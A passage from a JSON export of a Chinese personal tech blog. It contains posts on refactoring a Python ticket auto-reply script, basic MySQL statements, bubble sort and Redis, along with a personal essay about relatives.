为了保证单点故障下的数据可用性，Redis Cluster引入了Master节点和Slave节点。在Redis Cluster中，每个Master节点都会有对应的两个用于冗余的Slave节点。这样在整个集群中，任意两个节点的宕机都不会导致数据的不可用。当Master节点退出后，集群会自动选择一个Slave节点成为新的Master节点。","categories":[],"tags":[{"name":"redis","slug":"redis","permalink":"https://awen.me/tags/redis/"}]},{"title":"写代码的套路","slug":"写代码的套路","date":"2016-07-31T13:32:11.000Z","updated":"2021-02-26T06:05:29.315Z","comments":true,"path":"posts/53141.html","link":"","permalink":"https://awen.me/posts/53141.html","excerpt":"作为一个半道转行的人来说，干过运维、做过网工、当过讲师，也写过代码，代码写的少，非专业的。 不过往后我还是希望往运维开发方向发展。现在呢，每天都坚持写写代码。代码写的多了，自然就有感觉了。","text":"作为一个半道转行的人来说，干过运维、做过网工、当过讲师，也写过代码，代码写的少，非专业的。 不过往后我还是希望往运维开发方向发展。现在呢，每天都坚持写写代码。代码写的多了，自然就有感觉了。 现在看我之前写的一些代码啊，现在自己过来看我都觉得恶心，来给各位看官瞧一瞧，啥是烂代码，之前为了实现个自动化回复工单的程序，我就洋洋洒洒写了近1000行代码，其中有一个方法是用来检查是否有新工单的。他大概是这样的，判断工单是否有更新的情况下拿到标题去判断用户的问题，然后回复客户，老实讲这个程序当时就是随便写写的，写完跑一下，唉，可以用，于是就搞个服务器7*24小时挂着跑。一开始只是想着匹配几个标题去判断，就直接把要回复的内容都写代码里面了。后来加入的东西越来越多，我的妈呀，每次改个代码，看着这一堆中文夹在程序中，我就感到无比的恶心。而且，这个 if 语句判断也写的有问题。 def check_ticket_new(self): try: tickets_id = self.views_new_tickets()[0] organization_id = self.views_new_tickets()[1] if tickets_id is not None: userlist = self.users_admin_list() for id in tickets_id: comments = self.list_comments(id) auth_name = comments[2] author_id = comments[0] ticket_info = self.ticketid(id)[0] content = comments[-2] check_quota_value = self.check_quota(auth_name) self.kf5_info(&quot;check_quota {}&quot;.format(str(check_quota_value))) if author_id in userlist: pass else: for organization_id in organization_id: if ticket_info == &quot;确认退余额&quot;: pass elif ticket_info is not None and ticket_info[0:4] == &quot;面试作业&quot; : self.put_new_comments(id, &quot;open&quot;, &quot;&quot;&quot;您好，请点击这里进行&lt;a href=&quot;https://c.163yun.com/dashboard#/m/certify/&quot; target=&quot;_blank&quot;&gt; 个人实名认证&lt;a/&gt;, 提交后将会在一个工作日内完成认证的审核以及代金券的发放。在此之前，请您仔细阅读以下内容: &lt;br&gt;1.代金券只能创建按量付费模式的服务; &lt;br&gt;2.如因网易云的问题导致的服务不可用可以提交工单反馈给我们，除此之外我们不解答您任何关于作业中的创建服务以及配置或连接访问等问题，请独立完成作业，遇到问题请自行解决; &lt;br&gt;3.您需要根据作业要求在限定时间内完成并保留资源保证我们检查作业时是能够访问到您搭建的服务； &lt;br&gt;4.如因代金券余额不足，可以提交工单再次申请代金券，注意工单标题为[面试人:XXX，代金券不足，需要再次申请代金券完成作业]; &lt;br&gt;5.该工单状态会设置为[受理中]，待处理完毕后会回复该工单给您答复处理结果。在此期间，请勿回复该工单； &lt;br&gt; &lt;br&gt; 祝您面试顺利！网易云期待您的加入！ &quot;&quot;&quot;) elif ticket_info is not None and re.match(r&apos;.{0,}(退款|提现|退余额|余额转出|充值错误|余额退款|钱可以退吗)&apos;, ticket_info): self.put_new_comments(id, &quot;pending&quot;,&quot;&quot;&quot; 您好，尊敬的用户，为更好的完善网易云基础服务用户体验和服务质量，并继续跟进您的退款请求，请完成以下问卷： &lt;br&gt;1. 您是通过什么渠道知道网易云基础服务？ &lt;br&gt;2. 您是否使用过其他公司的云产品？分别有哪些？ &lt;br&gt;3. 您此次退款的原因？ &lt;br&gt;4. 您认为网易云基础服务需要优化的地方？ &lt;br&gt;&lt;br&gt;感谢您对网易云基础服务的支持，期待您的回复，谢谢！ &quot;&quot;&quot;) elif ticket_info is not None and re.match(r&apos;.{0,}(镜像仓库|推送|docker push|docker login|容器仓库|仓库)&apos;,ticket_info): ……上面这段风骚的代码也能干活，但是他非常不美观 、整洁。超级恶心。我确定这是我写的垃圾代码。这段代码是出自于网易云的一个客服之手，希望各位轻喷。如果是个开发写的这么烂的代码，估计早就被开除了。 在程序设计中有个东西叫 MVC，就是模型 视图 和控制，就和你写网页一样，html 单独写个文件，css 单独写个文件，js 单独写个文件，这样的好处是，容易维护，而且代码看着清晰。你要都整一块，就像我上面这段烂代码一样。 控制器（Controller）- 负责转发请求，对请求进行处理。 视图（View） - 界面设计人员进行图形界面设计。 模型（Model） - 程序员编写程序应有的功能（实现算法等等）、数据库专家进行数据管理和数据库设计(可以实现具体的功能)。 后来实在看不下去这个代码了，本身我也不是专业写代码的，就是觉得工作中有些活可以做成自动化，于是就自己学自己实现了。也在不断学习中吧。而且感觉写代码的是件非常有意思的事情，我讨厌枯燥无味的重复而又单调的工作。 于是重新写了一遍，我把要回复的内容，组成一个json 文件，类似这样 { &quot;reply&quot;:[ { &quot;id&quot;:1, &quot;status&quot;:&quot;new&quot;, &quot;source&quot;: &quot;ticket&quot;, &quot;rule&quot;:&quot;^面试作业&quot;, &quot;reply_status&quot;:&quot;open&quot;, &quot;msg&quot;:&quot;您好，请点击这里进行&lt;a href=&apos;https://c.163yun.com/dashboard#/m/certify/&apos; target=&apos;_blank&apos;&gt; 个人实名认证&lt;a/&gt;, 提交后将会在一个工作日内完成认证的审核以及代金券的发放。在此之前，请您仔细阅读以下内容: &lt;br&gt;1.代金券只能创建按量付费模式的服务; &lt;br&gt;2.如因网易云的问题导致的服务不可用可以提交工单反馈给我们，除此之外我们不解答您任何关于作业中的创建服务以及配置或连接访问等问题，请独立完成作业，遇到问题请自行解决; &lt;br&gt;3.您需要根据作业要求在限定时间内完成并保留资源保证我们检查作业时是能够访问到您搭建的服务； &lt;br&gt;4.如因代金券余额不足，可以提交工单再次申请代金券，注意工单标题为[面试人:XXX，代金券不足，需要再次申请代金券完成作业]; &lt;br&gt;5.该工单状态会设置为[受理中]，待处理完毕后会回复该工单给您答复处理结果。在此期间，请勿回复该工单； &lt;br&gt; &lt;br&gt; 祝您面试顺利！网易云期待您的加入！&quot; }, { &quot;id&quot;:2, &quot;status&quot;:&quot;new&quot;, &quot;source&quot;: &quot;ticket&quot;, &quot;reply_status&quot;:&quot;pending&quot;, &quot;rule&quot;:&quot;.{0,}(发票|开票)&quot;, &quot;msg&quot;:&quot;您好，根据您的问题，猜您可能想了解：&lt;br&gt; &lt;strong&gt;1.发票提交后多久寄出&lt;/strong&gt;&lt;br&gt;答:发票一般从您提交到开出需要5-7个工作日。&lt;br&gt;&lt;strong&gt;2.为什么我刚充的钱发票管理里面不显示？&lt;/strong&gt;&lt;br&gt;答: 发票的金额需要是已经消费的金额才可以申请，并且本月的（预付费和后付费）消费要到次月2号才可以申请发票。&lt;br&gt;&lt;strong&gt;3.开发票有最低金额限制吗？寄送发票免快递费吗？&lt;/strong&gt;&lt;br&gt;答: 开具发票目前暂无金额限制，寄送发票我们都是免费的。&lt;br&gt;&lt;strong&gt;4.在哪里开发票？&lt;/strong&gt;&lt;br&gt;答：您可以在控制台找到业务支持-业务消费-发票管理，点击申请发票，或直接点击跳转到&lt;a href=&apos;https://c.163yun.com/dashboard#/m/account/expense/invoice/&apos; target=&apos;_blank&apos;&gt;发票管理&lt;/a&gt; 页面。&lt;br&gt;&lt;strong&gt;5.怎么开具增值税专用发票?&lt;/strong&gt;&lt;br&gt;答:通过企业认证和专票信息审核的用户可以开具增值税专用发票；&lt;br&gt;&lt;strong&gt;6. 为什么我不能开具发票？&lt;/strong&gt;&lt;br&gt;答:可能出现的情况：1.账户欠费情况下不能申请发票。2.本月消费需要次月初才能开具发票。3.您未使用网易云基础服务的产品，例如使用的是云信的服务，则需联系云信申请发票。&lt;br&gt;&lt;strong&gt;7.开具发票需求注意什么？&lt;/strong&gt;&lt;br&gt;答:应国家税务总局要求，自2017年7月1日起，若开具增值税普通发票，企业类型必须具备税号，否则发票将无法用于企业报销。&quot; }, { &quot;id&quot;:3, &quot;status&quot;:&quot;new&quot;, &quot;source&quot;: &quot;ticket&quot;, &quot;reply_status&quot;:&quot;pending&quot;, &quot;rule&quot;:&quot;.{0,}(修改|更改)安全手机&quot;, &quot;msg&quot;:&quot;您好，因安全手机是用于云计算基础服务进行资源关键操作的安全验证的，如无法自助修改安全手机，请根据如下情况提交对应的资料。审核通过后可以协助您修改，我们会在 1-2 个工作日之内给您处理： &lt;br&gt;&lt;strong&gt;对于个人用户，请提交以下资料：&lt;/strong&gt;&lt;br&gt; 1.请工单提交注册时的身份证反面照片(有国徽的那面)以及手持身份证正面(含个人照片的那面)，并提供原安全手机号和需要修改的安全手机号&lt;br&gt; &lt;strong&gt;对于企业用户，需要您完善并打印以下模板内容，并加盖公司章拍照上传给我们:&lt;/strong&gt; &lt;br&gt; 公司名称：xxx公司 &lt;br&gt; 问题描述：因 xxx 原因无法自助修改安全手机，需要网易云协助修改安全手机。&lt;br&gt; 修改内容：&lt;br&gt; 原安全手机：xxx 修改为：xxx&quot; },然后加个方法 # 读取回复内容 def read_json_config(self): with open(&apos;/opt/kf5/robot.json&apos;, &apos;r&apos;) as f: data = json.load(f) status = [(d[&apos;status&apos;]) for d in data[&apos;reply&apos;]] source = [(d[&apos;source&apos;]) for d in data[&apos;reply&apos;]] rule = [(d[&apos;rule&apos;]) for d in data[&apos;reply&apos;]] reply_status = [(d[&apos;reply_status&apos;]) for d in data[&apos;reply&apos;]] msg = [(d[&apos;msg&apos;]) for d in data[&apos;reply&apos;]] return [status,source,rule,reply_status,msg]然后重写 check_ticket_new 方法，大概是下面这个样子。对比下看看，是不是好看多了。 # 判断工单是否是客服回复以及是否超过规定时间, SLA 5分钟响应，4小时客户未回复要发送消息通知用户回复工单，24小时客户未回复关闭工单！ # 判断新工单是否有人回复，如果没有受理则自动回复用户一条信息，确保 SLA 不超时 def check_ticket_new(self): tickets_id = self.views_new_tickets()[0] organization_id = self.views_new_tickets()[1] read_config = self.read_json_config() status = read_config[0] source = read_config[1] rule = read_config[2] reply_status = read_config[3] msg = read_config[4] if tickets_id is None and organization_id is None: return userlist = self.users_admin_list() if userlist is None: return for id in tickets_id: comments = self.list_comments(id) auth_name = comments[2] author_id = comments[0] ticket_info = self.ticketid(id)[0] content = comments[-2] check_quota_value = self.check_quota(auth_name) if comments and auth_name and author_id and ticket_info and content is None: return if author_id in userlist: return for i in range(len(organization_id)): organization_id = organization_id[i] print(organization_id) print(ticket_info) if ticket_info == &quot;确认退余额&quot;: pass if organization_id is None: organization_id = &quot;NOAUTH&quot; if check_quota_value == &quot;LAJI&quot; and re.match(r&apos;.{0,}(配额)&apos;, ticket_info): check_quota_value = &quot;LAJI&quot; for info in range(len(status)): print(info) if check_quota_value == rule[info]: self.put_new_comments(id, reply_status[info],msg[info]) return if re.search(rule[info],ticket_info): self.put_new_comments(id, reply_status[info],msg[info]) return if organization_id == rule[info]: self.put_new_comments(id, reply_status[info], msg[info]) return self.put_new_comments(id, &quot;open&quot;, &quot;您好，您的问题已收到，我们正在处理中！&quot;)写代码其实有很多套路的。比如 变量名：要么驼峰式命名，类似这样 agentStatus,要么下划线 agent_status 变量名要有意义，尽量使用英文。 要有注释。 如果层级特别多，把他提炼出一个函数或方法 一个方法或函数只做一件事。 多去 github 读一读优秀的代码。 避免写多层嵌套，例如 下面这段 代码 def do_offline(self,headers=headers): online_offline_url = &quot;https://yun163.kf5.com/apiv2/kchat/agent/availabilities.json&quot; chats_url = &quot;https://yun163.kf5.com/apiv2/kchat/monitor/chats.json&quot; querystring = {&quot;agent_id&quot;: &quot;2775056&quot;, &quot;status&quot;: &quot;offline&quot;} while 1: chats_response = requests.request(&quot;GET&quot;, chats_url, headers=headers) if chats_response.status_code == 200: ch_json = chats_response.json() if len(ch_json[&apos;chats&apos;]) == 0: offline_time = str(time.strftime(&quot;%H%M&quot;, time.localtime())) print(offline_time) offline_area = [1130, 1730, 2000] if int(offline_time) in offline_area: offline_response = requests.request(&quot;PUT&quot;, online_offline_url, headers=headers,params=querystring) if offline_response.status_code == 200: offline_json = offline_response.json() offline_name = offline_json[&apos;agent&apos;][&apos;name&apos;] if offline_json[&apos;agent&apos;][&apos;webStatus&apos;] == &quot;offline&quot; and offline_json[&apos;agent&apos;][&apos;appStatus&apos;] == &quot;offline&quot;: self.send_message_wchat(&quot;通知&quot;,offline_name + &quot; Web 端和 APP 端都已下线&quot;) if offline_json[&apos;agent&apos;][&apos;webStatus&apos;] == &quot;offline&quot; and offline_json[&apos;agent&apos;][&apos;appStatus&apos;] != &quot;offline&quot;: self.send_message_wchat(&quot;通知&quot;,offline_name + &quot; Web 端已下线但是 APP 端未下线，请在手机 APP 操作&quot;) time.sleep(10)看，都斜歪到姥姥家了，这种代码就特别难看，可以多使用逆向思维，比如判断状态是不是200 ，你直接判断状态不是200 直接就 return 掉。这样就不用 else 了，上面的代码修改下 # 设置IM 下线时间 def do_offline(self, headers=headers): online_offline_url = &quot;https://yun163.kf5.com/apiv2/kchat/agent/availabilities.json&quot; chats_url = &quot;https://yun163.kf5.com/apiv2/kchat/monitor/chats.json&quot; querystring = {&quot;agent_id&quot;: &quot;2775056&quot;, &quot;status&quot;: &quot;offline&quot;} while 1: chats_response = requests.request(&quot;GET&quot;, chats_url, headers=headers) if chats_response.status_code != 200: return ch_json = chats_response.json() if len(ch_json[&apos;chats&apos;]) != 0: return offline_time = str(time.strftime(&quot;%H%M&quot;, time.localtime())) print(offline_time) offline_area = [1130, 1720, 2000] if int(offline_time) in offline_area is False: return offline_response = requests.request(&quot;PUT&quot;, online_offline_url, headers=headers,params=querystring) if offline_response.status_code != 200: return offline_json = offline_response.json() offline_name = offline_json[&apos;agent&apos;][&apos;name&apos;] web_status = offline_json[&apos;agent&apos;][&apos;webStatus&apos;] app_status = offline_json[&apos;agent&apos;][&apos;appStatus&apos;] if web_status == &quot;offline&quot; and app_status == &quot;offline&quot;: self.send_message_wchat(&quot;通知&quot;, offline_name + &quot; Web 端和 APP 端都已下线&quot;) if web_status == &quot;offline&quot; and app_status == &quot;offline&quot;: return if self.offline_all() == True: self.send_message_wchat(&quot;通知&quot;, offline_name + &quot; 所有端已全部下线！&quot;) return self.send_message_wchat(&quot;通知&quot;, offline_name + &quot; Web 端已下线但是 APP 端未下线，请在手机 APP 操作&quot;) time.sleep(30)嗯，任重而道远，需要学习的地方还很多，最近在看《代码整洁之道》 先把套路学会了，后面在学下 python web 开发。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"所谓的亲戚关系","slug":"所谓的亲戚关系","date":"2016-07-05T22:44:18.000Z","updated":"2021-02-26T06:05:29.337Z","comments":true,"path":"posts/44369.html","link":"","permalink":"https://awen.me/posts/44369.html","excerpt":"我有很多亲戚，我爸和我妈那边都有，有的亲戚如果不是家里办个大事，其实我是根本就不认识。一年到头也不来往，没有任何交集。不知道这样的关系也能算亲？路上认识个人，如果不是和我爸一起他说这是你某某亲戚，我是根本不认识的。","text":"我有很多亲戚，我爸和我妈那边都有，有的亲戚如果不是家里办个大事，其实我是根本就不认识。一年到头也不来往，没有任何交集。不知道这样的关系也能算亲？路上认识个人，如果不是和我爸一起他说这是你某某亲戚，我是根本不认识的。 其实就算是血亲，有的亲戚也只不过是平日里大家看似和谐，过年过节的送点不值钱的礼物，以为这样就能够促进亲戚关系长期发展了？如果真的发生点什么事情，是不可能指望得上这些所谓的亲戚的，有时候，所谓的亲戚还不如刚认识的朋友。 在我眼里，没有什么亲戚不亲戚，双方能谈得来，你对我好，我也会同样对你好。大家互帮互助，不是想着法的算计对方，就这样，没这3点条件，就算是有血缘关系，我也当不认识，最多大家见面“和谐”似的打个招呼，其实和路人也没啥不一样。 另外，就是千万不要去亲戚的公司或和亲戚一起出去干活。不到万不得已，不要问亲戚借钱，如果真要借约定好利息，按时还！ 有的亲戚啊，自以为是亲戚，就想尽办法占便宜，给他干个活，几年了工资都不结，还倒贴借钱都不还。这特么也算亲戚，我艹！你有困难，别人就没困难了？不需要过日子了？不需要养家糊口了。 给这种亲戚干活，只能干到死，是真他妈的干死了，钱都拿不回来。 欠钱没还，都好几年了，工钱没给，还问人借了钱，现在人给你干活都工作期间死了！让你把账算下，有错吗？居然说都是亲戚，我还会不还钱？ 哥们，你的信用早就一文不值了，好么！ 所以，对于我来说，那些八竿子打不着的亲戚，我是不会认的，血亲里面我认为关系好的，我会自然去维持这段关系，除非关系不好了，对于本来关系就一般的，没什么交集的，去他娘的吧！与我何干。","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"Mysql 基础知识","slug":"Mysql-基础知识","date":"2016-03-21T09:30:44.000Z","updated":"2021-02-26T06:05:29.260Z","comments":true,"path":"posts/62895.html","link":"","permalink":"https://awen.me/posts/62895.html","excerpt":"SQL 分类DDL ( Data Definition Languages)语句:数据定义语言，这些语句定义了不同的数据段、数据库、表、列、索引等数据库对象。常用的语句关键字主要包括create、drop、 alter 等。 DML ( Data Manipulation Language)语句:数据操纵语句，用于添加、删除、更新和查询数据库记录，并检查数据完整性。常用的语句关键字主要包括insert、 delete、 update和select等。 DCL ( Data Control Language)语句:数据控制语句，用于控制不同数据段直接的许可和访问级别的语句。这些语句定义了数据库、表、字段、用户的访问权限和安全级别。主要的语句关键字包括grant、 revoke 等。","text":"SQL 分类DDL ( Data Definition Languages)语句:数据定义语言，这些语句定义了不同的数据段、数据库、表、列、索引等数据库对象。常用的语句关键字主要包括create、drop、 alter 等。 DML ( Data Manipulation Language)语句:数据操纵语句，用于添加、删除、更新和查询数据库记录，并检查数据完整性。常用的语句关键字主要包括insert、 delete、 update和select等。 DCL ( Data Control Language)语句:数据控制语句，用于控制不同数据段直接的许可和访问级别的语句。这些语句定义了数据库、表、字段、用户的访问权限和安全级别。主要的语句关键字包括grant、 revoke 等。 默认数据库的功能默认的mysql 库含义 12345678910mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema || sys |+--------------------+5 rows in set (0.00 sec) information schema: 主要存储了系统中的一些数据库对象信息，比如用户表信息、列信息、权限信息、字符集信息、分区信息等。 performance_schema:主要用于收集数据库服务器性能参数。 MySQL 5.5开始新增一个数据库：PERFORMANCE_SCHEMA，主要用于收集数据库服务器性能参数。并且库里表的存储引擎均为PERFORMANCE_SCHEMA，而用户是不能创建存储引擎为PERFORMANCE_SCHEMA的表。MySQL5.5默认是关闭的，需要手动开启，在配置文件里添加：performance_schema=ON 查看 performance_schema 是否打开 1234567mysql&gt; show variables like &#39;performance_schema&#39;;+--------------------+-------+| Variable_name | Value |+--------------------+-------+| performance_schema | ON |+--------------------+-------+1 row in set (0.01 sec) 查看表结构 123456789101112131415mysql&gt; desc voice_info;+-----------------+------------------+------+-----+-------------------+----------------+| Field | Type | Null | Key | Default | Extra |+-----------------+------------------+------+-----+-------------------+----------------+| voice_id | int(10) unsigned | NO | PRI | NULL | auto_increment || username | varchar(100) | NO | | NULL | || send_date | timestamp | YES | | CURRENT_TIMESTAMP | || send_messages | int(1) | NO | | NULL | || send_phone | int(1) | NO | | NULL | || send_popo | int(1) | NO | | NULL | || send_stone | int(1) | NO | | NULL | || chat_id | int(32) | NO | | NULL | || time_out_minute | int(10) | NO | | NULL | |+-----------------+------------------+------+-----+-------------------+----------------+9 rows in set (0.00 sec) 查看详细的表定义信息 1mysql&gt; show create table user \\G; \\G 含义：能够按照字段竖向排列。 追加字段 add 123mysql&gt; alter table voice_info add column age int(3);Query OK, 0 rows affected (0.20 sec)Records: 0 Duplicates: 0 Warnings: 0 修改字段名称和类型 modify 和 change 123mysql&gt; alter table voice_info change age age1 int(4);Query OK, 0 rows affected (0.02 sec)Records: 0 Duplicates: 0 Warnings: 0 或 123mysql&gt; alter table voice_info modify age varchar(20);Query OK, 90 rows affected (0.20 sec)Records: 90 Duplicates: 0 Warnings: 0 注意: change 和modify都可以修改表的定义，不同的是change 后面需要写两次列名，不方便。但是change的优点是可以修改列名称，modify则不能。 删除字段drop 123mysql&gt; alter table voice_info drop column age1;Query OK, 0 rows affected (0.13 sec)Records: 0 Duplicates: 0 Warnings: 0 在某个字段前面追加字段 123mysql&gt; alter table voice_info add name varchar(20) after age;Query OK, 0 rows affected (0.12 sec)Records: 0 Duplicates: 0 Warnings: 0 将某个字段移动到最前面 123mysql&gt; alter table voice_info modify age int(4) first;Query OK, 90 rows affected (0.11 sec)Records: 90 Duplicates: 0 Warnings: 0","categories":[],"tags":[{"name":"mysql","slug":"mysql","permalink":"https://awen.me/tags/mysql/"}]},{"title":"Python 实现冒泡算法","slug":"Python-实现冒泡算法","date":"2016-01-04T06:51:14.000Z","updated":"2021-02-26T06:05:29.262Z","comments":true,"path":"posts/50904.html","link":"","permalink":"https://awen.me/posts/50904.html","excerpt":"","text":"冒泡算法(Bubble Sort) 是一种简单的排序算法。它重复地走访过要排序的数列，一次比较两个元素，如果他们的顺序错误就把他们交换过来。走访数列的工作是重复地进行直到没有再需要交换，也就是说该数列已经排序完成。这个算法的名字由来是因为越小的元素会经由交换慢慢“浮”到数列的顶端。 冒泡排序算法的流程如下： 比较相邻的元素。如果第一个比第二个大，就交换他们两个。 对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对。在这一点，最后的元素应该会是最大的数。 针对所有的元素重复以上的步骤，除了最后一个。 持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。 由于它的简洁，冒泡排序通常被用来对于程序设计入门的学生介绍算法的概念。 代码#-*-coding:utf-8-*- def bubbleSort(n): for j in xrange(len(n),-1,-1): for i in xrange(0,j-1,1): if n[i] &gt; n[i+1]: n[i],n[i+1]= n[i+1],n[i] if __name__==&apos;__main__&apos;: numbers = [[5,32,1,24,600,123],[&apos;2&apos;,&apos;3&apos;,&apos;123&apos;,&apos;64&apos;,&apos;45&apos;],[&apos;a&apos;,&apos;d&apos;,&apos;g&apos;,&apos;b&apos;]] for num in numbers: bubbleSort(num) print num","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"mysql 基础语法回顾","slug":"mysql-基础语法回顾","date":"2015-12-26T03:29:01.000Z","updated":"2021-02-26T06:05:29.279Z","comments":true,"path":"posts/12924.html","link":"","permalink":"https://awen.me/posts/12924.html","excerpt":"创建数据库mysql&gt;create database wordpress;删除数据库mysql&gt;drop database wordpress;查看数据库","text":"创建数据库mysql&gt;create database wordpress;删除数据库mysql&gt;drop database wordpress;查看数据库 mysql&gt;show databases;进入数据库mysql&gt;use databasename创建表 mysql&gt; CREATE TABLE IF NOT EXISTS `user`( -&gt; `uuid` VARCHAR(36) NOT NULL, -&gt; `name` VARCHAR(30) NOT NULL, -&gt; `date` DATE, -&gt; PRIMARY KEY (`id`) -&gt; )ENGINE=InnoDB DEFAULT CHARSET=utf8; Query OK, 0 rows affected (0.04 sec)实例解析： 如果你不想字段为 NULL 可以设置字段的属性为 NOT NULL， 在操作数据库时如果输入该字段的数据为NULL ，就会报错。 AUTO_INCREMENT定义列为自增的属性，一般用于主键，数值会自动加1。 PRIMARY KEY关键字用于定义列为主键。 您可以使用多列来定义主键，列间以逗号分隔。 ENGINE 设置存储引擎，CHARSET 设置编码。 显示表mysql&gt; show tables; +---------------------+ | Tables_in_wordpress | +---------------------+ | user | +---------------------+ 1 row in set (0.01 sec)查看表结构mysql&gt; desc user ; +-------+-------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +-------+-------------+------+-----+---------+-------+ | id | varchar(36) | NO | PRI | NULL | | | name | varchar(30) | NO | | NULL | | | date | date | YES | | NULL | | +-------+-------------+------+-----+---------+-------+ 3 rows in set (0.01 sec) mysql&gt;删除表mysql&gt; drop table user; Query OK, 0 rows affected (0.02 sec)显示表mysql&gt; show tables; +---------------------+ | Tables_in_wordpress | +---------------------+ | apps | | user | +---------------------+ 2 rows in set (0.00 sec)插入数据mysql&gt; INSERT INTO user (uuid,name,date) VALUES (UUID(),&apos;张三&apos;,NOW()); Query OK, 1 row affected, 1 warning (0.02 sec)查看数据mysql&gt; SELECT * FROM user; +--------------------------------------+--------+------------+ | uuid | name | date | +--------------------------------------+--------+------------+ | 8e0ce8f4-e9e6-11e7-aa91-fa163e4d93c3 | 张三 | 2017-12-26 | +--------------------------------------+--------+------------+ 1 row in set (0.00 sec) 当数据量大时，不建议使用通配符 * 去查询数据 查看指定字段的数据mysql&gt; SELECT uuid,name FROM user; +--------------------------------------+--------+ | uuid | name | +--------------------------------------+--------+ | 8e0ce8f4-e9e6-11e7-aa91-fa163e4d93c3 | 张三 | +--------------------------------------+--------+ 1 row in set (0.00 sec)WHERE 子句当数据量比较大时候，我们需要查询某一条字段，需要根据条件去过滤，例如有表 mysql&gt; select * from user; +--------------------------------------+--------+------------+ | uuid | name | date | +--------------------------------------+--------+------------+ | 8e0ce8f4-e9e6-11e7-aa91-fa163e4d93c3 | 张三 | 2017-12-26 | | ec0bd4cf-e9e6-11e7-aa91-fa163e4d93c3 | 李四 | 2017-12-26 | | eec4e0b2-e9e6-11e7-aa91-fa163e4d93c3 | 王五 | 2017-12-26 | | f39e6daf-e9e6-11e7-aa91-fa163e4d93c3 | 牛二 | 2017-12-26 | | f769b50a-e9e6-11e7-aa91-fa163e4d93c3 | 狗娃 | 2017-12-26 | +--------------------------------------+--------+------------+ 5 rows in set (0.00 sec)我们希望查询李四的信息，则使用 where mysql&gt; select uuid,name,date from user where name=&apos;李四&apos; -&gt; ; +--------------------------------------+--------+------------+ | uuid | name | date | +--------------------------------------+--------+------------+ | ec0bd4cf-e9e6-11e7-aa91-fa163e4d93c3 | 李四 | 2017-12-26 | +--------------------------------------+--------+------------+ 1 row in set (0.00 sec)说明： 查询语句中你可以使用一个或者多个表，表之间使用逗号, 分割，并使用 WHERE 语句来设定查询条件。 可以在 WHERE 子句中指定任何条件。 可以使用 AND 或者 OR 指定一个或多个条件。 WHERE 子句也可以运用于 SQL 的 DELETE 或者 UPDATE 命令。 操作符 描述 实例 = 等号，检测两个值是否相等，如果相等返回true (A = B) 返回false。 &lt;&gt;, != 不等于，检测两个值是否相等，如果不相等返回true (A != B) 返回 true。 &gt; 大于号，检测左边的值是否大于右边的值, 如果左边的值大于右边的值返回true (A &gt; B) 返回false。 &lt; 小于号，检测左边的值是否小于右边的值, 如果左边的值小于右边的值返回true (A &lt; B) 返回 true。 &gt;= 大于等于号，检测左边的值是否大于或等于右边的值, 如果左边的值大于或等于右边的值返回true (A &gt;= B) 返回false。 &lt;= 小于等于号，检测左边的值是否小于于或等于右边的值, 如果左边的值小于或等于右边的值返回true (A &lt;= B) 返回 true。 UPDATE 查询mysql&gt; UPDATE user SET name=&apos;李五&apos; where uuid=&apos;ec0bd4cf-e9e6-11e7-aa91-fa163e4d93c3&apos;; Query OK, 1 row affected (0.01 sec) Rows matched: 1 Changed: 1 Warnings: 0DELETE 语句mysql&gt; delete from user where uuid=&apos;ec0bd4cf-e9e6-11e7-aa91-fa163e4d93c3&apos;; Query OK, 1 row affected (0.01 sec)LIKE 语句mysql&gt; SELECT * FROM user WHERE name like &apos;牛%&apos;; +--------------------------------------+--------+------------+ | uuid | name | date | +--------------------------------------+--------+------------+ | 2f379b0d-e9e8-11e7-aa91-fa163e4d93c3 | 牛一 | 2017-12-26 | | 31d28bb1-e9e8-11e7-aa91-fa163e4d93c3 | 牛二 | 2017-12-26 | | 3a914c85-e9e8-11e7-aa91-fa163e4d93c3 | 牛三 | 2017-12-26 | | f39e6daf-e9e6-11e7-aa91-fa163e4d93c3 | 牛二 | 2017-12-26 | +--------------------------------------+--------+------------+ 4 rows in set (0.00 sec) 可以在 WHERE 子句中指定任何条件。 可以在 WHERE 子句中使用LIKE子句。 可以使用LIKE子句代替等号 =。 LIKE 通常与 % 一同使用，类似于一个元字符的搜索。 可以使用 AND 或者 OR 指定一个或多个条件。 可以在 DELETE 或 UPDATE 命令中使用 WHERE…LIKE 子句来指定条件。","categories":[],"tags":[{"name":"mysql","slug":"mysql","permalink":"https://awen.me/tags/mysql/"}]},{"title":"redis简介和使用","slug":"redis简介和使用","date":"2015-12-04T04:36:42.000Z","updated":"2021-02-26T06:05:29.290Z","comments":true,"path":"posts/3748633130.html","link":"","permalink":"https://awen.me/posts/3748633130.html","excerpt":"简介redis（Remote Dictionary Server）是一种Nosql技术，它是一个开源的高级kv存储和数据结构存储系统，它经常被拿来和Memcached相比较，但是Memcached不提供持久化的数据保存机制而redis可以将数据保存在磁盘中，redis不仅仅是能够存储key和value这种简单的键值对，还能存储例如集合、hash表、列表、字典等。redis在整个运行过程中，数据统统都是存储在内存中的，因此，性能是相当高的，由于此特性，redis对于内存的要求比较高，它会周期性的将内存中的数据写入在磁盘中，从而实现数据持久化的访问能力，但是这种存储只是保证redis在下次启动还有数据可以读取，而不是提供访问。redis是单线程服务的，只有一个线程。redis还支持主从模式以及支持通过lua脚本去编写扩展，并且支持高可用和分布式集群解决方案。","text":"简介redis（Remote Dictionary Server）是一种Nosql技术，它是一个开源的高级kv存储和数据结构存储系统，它经常被拿来和Memcached相比较，但是Memcached不提供持久化的数据保存机制而redis可以将数据保存在磁盘中，redis不仅仅是能够存储key和value这种简单的键值对，还能存储例如集合、hash表、列表、字典等。redis在整个运行过程中，数据统统都是存储在内存中的，因此，性能是相当高的，由于此特性，redis对于内存的要求比较高，它会周期性的将内存中的数据写入在磁盘中，从而实现数据持久化的访问能力，但是这种存储只是保证redis在下次启动还有数据可以读取，而不是提供访问。redis是单线程服务的，只有一个线程。redis还支持主从模式以及支持通过lua脚本去编写扩展，并且支持高可用和分布式集群解决方案。 Redis特点 运行在内存 持久化 